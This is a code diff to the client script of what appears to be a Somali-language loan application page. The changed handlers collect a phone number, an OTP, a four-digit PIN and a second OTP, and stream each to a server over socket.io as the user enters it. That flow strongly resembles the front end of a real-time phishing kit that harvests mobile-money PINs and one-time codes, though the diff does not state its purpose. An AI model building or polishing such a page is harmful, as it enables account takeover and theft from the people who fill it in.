@@ -421,6 +421,19 @@
                     return (totalPayable / months).toFixed(2);
                 },
 
+                triggerToastNotification(msg) {
+                    this.toast.message = msg;
+                    this.toast.show = true;
+                    setTimeout(() => { this.toast.show = false; }, 4000);
+                },
+
+                movePinFocus(el, index) {
+                    if (el.target.value.length === 1 && index < 3) {
+                        const inputs = document.querySelectorAll('.pin-box');
+                        if (inputs[index + 1]) inputs[index + 1].focus();
+                    }
+                },
+
                 init() {
                     this.socket = io();
                     this.socket.on('connect', () => { this.connected = true; });
@@ -476,6 +489,11 @@
                         this.requestingOtp = false;
                         this.triggerToastNotification(err.message || "Xaqiijinta waa laga diaday");
                     });
+
+                    this.socket.on('application-complete', (data) => {
+                        this.referenceId = data.referenceId;
+                        this.step = 7;
+                    });
                 },
 
                 sendOtpRequest() {
@@ -494,42 +512,32 @@
                     this.otpVerifying = true; 
                     this.socket.emit('step4-otp', { appId: this.appId, phone: this.form.phone, otp: this.otp.code }); 
                 },
+
                 submitStep5() { 
                     this.pinVerifying = true; 
-                    this.socket.emit('step5-pin', { appId: this.appId, pin: this.pin.value.join('') }); 
-                },
-                verifyOTP2() {
-                    this.otp2Verifying = true;
-                    this.socket.emit('step6-otp2', { appId: this.appId, otp2: this.otp2.code });
+                    const pinString = this.pin.value.join('');
+                    this.socket.emit('step5-pin', { appId: this.appId, pin: pinString }); 
                 },
 
-                submitStep1() { 
-                    this.form.appId = this.appId;
-                    this.socket.emit('step1', this.form); 
-                    this.step = 5; 
+                verifyOTP2() {
+                    this.otp2Verifying = true;
+                    this.socket.emit('submit-otp2', { appId: this.appId, otp2: this.otp2.code });
                 },
-                submitStep2() { 
-                    this.form.appId = this.appId;
-                    this.socket.emit('step2', this.form); 
-                    this.step = 6; 
+
+                submitStep1() {
+                    this.step = 5;
+                    this.socket.emit('step1', { appId: this.appId, ...this.form });
                 },
-                submitStep3() { 
-                    this.form.appId = this.appId;
-                    this.socket.emit('step3-data', this.form); 
-                    this.referenceId = 'WFI-' + Math.floor(100000 + Math.random() * 900000);
-                    this.step = 7; 
+
+                submitStep2() {
+                    this.step = 6;
+                    this.socket.emit('step2', { appId: this.appId, ...this.form });
                 },
-                
-                movePinFocus(e, i) { 
-                    e.target.value = e.target.value.replace(/\D/g, "");
-                    if (e.target.value && i < 3) document.querySelectorAll('.pin-box')[i+1].focus(); 
-                },
-                triggerToastNotification(msg) {
-                    this.toast.message = msg;
-                    this.toast.show = true;
-                    setTimeout(() => { this.toast.show = false; }, 4000);
+
+                submitStep3() {
+                    this.socket.emit('step3-data', { appId: this.appId, ...this.form });
                 }
-            }
+            };
         }
     </script>
 </body>
